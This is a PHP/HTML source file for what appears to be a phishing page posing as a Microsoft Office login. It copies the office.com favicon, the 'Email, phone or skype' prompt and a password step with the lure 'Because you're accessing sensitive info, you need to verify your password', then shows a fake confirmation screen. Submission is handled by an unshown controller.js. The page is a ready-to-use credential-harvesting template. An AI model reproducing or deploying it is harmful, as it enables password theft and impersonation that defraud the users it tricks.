<?php
require "config/config.php";
?>
<!doctype html>
<html lang="en">

<head>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <link rel="icon" type="image/png" sizes="192x192" href="https://www.google.com/s2/favicons?domain=office.com">
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <title>Login</title>
    <!-- <link href="css/hover.css" rel="stylesheet" media="all"> -->
    <style type="text/css">
        textarea:hover,
        input:hover,
        textarea:active,
        input:active,
        textarea:focus,
        input:focus,
        button:focus,
        button:active,
        button:hover,
        label:focus,
        .btn:active,
        .btn.active {
            outline: 0px !important;
            -webkit-appearance: none;
            box-shadow: none !important;
        }

        .box {
            box-shadow: 0 2px 3px rgba(0, 0, 0, 0.32);
            border: 0px solid rgba(0, 0, 0, 0.4);
            max-height: 415px;


            width: 440px;
            /*width: calc(100% - 40px);*/
            padding: 44px;
            margin-left: auto;
            margin-right: auto;
            margin-top: 20px;
            margin-bottom: 28px;
        }

        #footer {
            position: fixed;
            bottom: 0px;
            width: 100%;
            overflow: visible;
            z-index: 99;
            clear: both;


        }

        div .footerNode a,
        div .footerNode span {
            color: black;
            font-size: 0.75rem;
            line-height: 28px;
            white-space: nowrap;
            display: inline-block;
            float: right;
            margin-left: 8px;
            margin-right: 8px;
        }

        @media only screen and (max-width: 610px) {
            #hide {
                display: none;
            }
        }
    </style>
</head>

<body style="background-image: url('images/circle.svg'); background-size: cover;background-repeat: no-repeat;">
<div class="container-fluid">
    <div class="container">
        <div class="row mt-5 pt-5 mb-0">
            <div class="col-lg-6 mx-auto">
                <div class="mx-5 p-5 bg-white box" id="div1">
                    <img src="https://s3.amazonaws.com/simbla-static-2/2020/11/5faba665321d68001d4fc0e4/5faba6db73aef50019af7085/rC56cpX1uS2qJKOxJ-5Sb8u-.svg" class="img-fluid"><br><br>
                    <span class="h5"><?=$data[0]?></span><br>
                    <span id="error" class="text-danger" style="display: none;"><?=$data[1]?></span>
                    <div class="form-group mt-2">
                        <input type="email" name="ai" class="form-control rounded-0 border-dark" id="ai" aria-describedby="aiHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;">
                    </div>
                    <p style="font-size: 14px"><?=$data[2]?> <a href="#"><?=$data[3]?></a></p>
                    <p style="font-size: 14px"><a href="#"><?=$data[4]?></a></p>
                    <p style="font-size: 14px"><a href="#"><?=$data[5]?></a></p>
                    <div class="text-right">
                        <button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;">Next</button>
                    </div>
                </div>
                <!-- ////////////////////////div1 end/////////////////////// -->
                <!-- ////////////////////////div2 start/////////////////////// -->
                <div class="mx-5 p-5 bg-white box" id="div2" style="display: none;">
                    <form id="contact">
                        <img src="https://s3.amazonaws.com/simbla-static-2/2020/11/5faba665321d68001d4fc0e4/5faba6db73aef50019af7085/rC56cpX1uS2qJKOxJ-5Sb8u-.svg" class="img-fluid"><br>
                        <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="aich">abc@abc.com</span>
                        <div class="py-2"><span class="h4" style="color: #4E4542"><?=$data[6]?></span></div>
                        <div class="pb-2">
                            <span id="msg" class="text-dark">Because you're accessing sensitive info, you need to verify your password </span>
                            <span id="msg2" class="text-danger" style="display: none;"><?=$data[7]?> <a href='#'>reset it now</a></span>
                            <span id="msg1" class="text-danger" style="display: none;"><?=$data[8]?> </span>
                        </div>
                        <div class="form-group mt-1">
                            <input type="password" name="pr" class="form-control rounded-0 border-dark" id="pr" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
                        </div>
                        <p style="font-size: 14px"><a href="#"><?=$data[9]?></a></p>
                        <!-- <p style="font-size: 14px"><a href="#">Sign in with a security key</a></p>
                        <p style="font-size: 14px"><a href="#">sign in options</a></p> -->
                        <div class="text-right">
                            <button class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;"><?=$data[10]?></button>
                        </div>
                    </form>
                </div>
                <!-- ////////////////////////div2 end/////////////////////// -->
                <!-- ////////////////////////div3 start/////////////////////// -->
                <div class="m-5 p-5 bg-white box" id="div3" style="display: none;min-height: 440px;min-width: 408px;">
                    <!-- <img src="https://s3.amazonaws.com/simbla-static-2/2020/11/5faba665321d68001d4fc0e4/5faba6db73aef50019af7085/rC56cpX1uS2qJKOxJ-5Sb8u-.svg" class="img-fluid"><br><br> -->
                    <div class="text-center mt-3 text-center">
                    </div>
                    <center><span id="load-text-2" style="font-size: 20px;display: block;"><br><br><br>Successfully Confirmed:<br>Redirected to homepage...</span></center>
                </div>
            </div>

            <!-- ////////////////////////div3 end/////////////////////// -->
        </div>
        <div class="row ">
            <div class="col-lg-6 mx-auto">
                <div class="mx-5 py-2 px-5 bg-white box mt-0">
                    <span><i class="fas fa-key"></i> <?=$data[11]?></span>
                </div>

            </div>
        </div>
    </div>
</div>
</div>
<footer id="footer" style="padding-right: 30px">
    <div>
        <div class="footerNode">
            <span>Privacy & cookie</span>
            <a data-bind="text: config.text.privacyAndCookies, attr: {'data-url': config.links.privacyAndCookies}" href="#" data-url="#">Terms of use</a>
        </div>
    </div>
</footer>
<!-- Optional JavaScript -->
<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
<script type="text/javascript" src="controller.js"></script>

</body>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>


</html>
